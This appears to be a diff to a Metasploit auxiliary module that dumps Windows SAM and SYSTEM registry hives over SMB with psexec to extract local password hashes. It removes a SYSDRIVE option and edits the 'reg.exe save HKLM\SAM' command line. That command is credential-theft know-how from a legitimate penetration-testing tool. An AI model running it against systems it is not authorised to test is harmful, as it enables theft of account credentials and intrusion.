@@ -29,9 +29,9 @@ class Metasploit3 < Msf::Auxiliary
 		super(
 			'Name'        => 'SMB - Grab Local User Hashes',
 			'Description' => %Q{
-				This module extracts local user account password hashes from the 
-				SAM and SYSTEM hive files by authenticating to the target machine and 
-				downloading a copy of the hives.  The hashes are extracted offline on 
+				This module extracts local user account password hashes from the
+				SAM and SYSTEM hive files by authenticating to the target machine and
+				downloading a copy of the hives.  The hashes are extracted offline on
 				the attacking machine.  This all happenes without popping a shell or uploading
 				anything to the target machine.  Local Admin credentials (password -or- hash) are required
 			},
@@ -50,7 +50,6 @@ class Metasploit3 < Msf::Auxiliary
 			OptString.new('LOGDIR', [true, 'This is a directory on your local attacking system used to store Hive files and hashes', '/tmp/msfhashes/local']),
 			OptString.new('RPORT', [true, 'The Target port', 445]),
 			OptString.new('WINPATH', [true, 'The name of the WINDOWS directory on the remote host', 'WINDOWS']),
-			OptString.new('SYSDRIVE', [true, 'The root drive letter on the remote host', 'C:']),
 		], self.class)
 		deregister_options('RHOST')
 	end
@@ -77,7 +76,6 @@ class Metasploit3 < Msf::Auxiliary
 				return
 			end
 			if save_reg_hives(sampath, syspath)
-				#[sampath, syspath].each { |file| register_file_for_cleanup("#{datastore['SYSDRIVE']}\\#{file}") }
 				d = download_hives(sampath, syspath, logdir)
 				sys, sam = open_hives(logdir, hives)
 				if d
@@ -96,7 +94,7 @@ class Metasploit3 < Msf::Auxiliary
 		vprint_status("#{peer} - Creating hive copies.")
 		begin
 			# Try to save the hive files
-			command = "%COMSPEC% /C reg.exe save HKLM\\SAM #{datastore['SYSDRIVE']}#{sampath} /y && reg.exe save HKLM\\SYSTEM #{datastore['SYSDRIVE']}#{syspath} /y"
+			command = "%COMSPEC% /C reg.exe save HKLM\\SAM #{sampath} /y && reg.exe save HKLM\\SYSTEM #{syspath} /y"
 			return psexec(command)
 		rescue StandardError => saveerror
 			print_error("#{peer} - Unable to create hive copies with reg.exe: #{saveerror}")
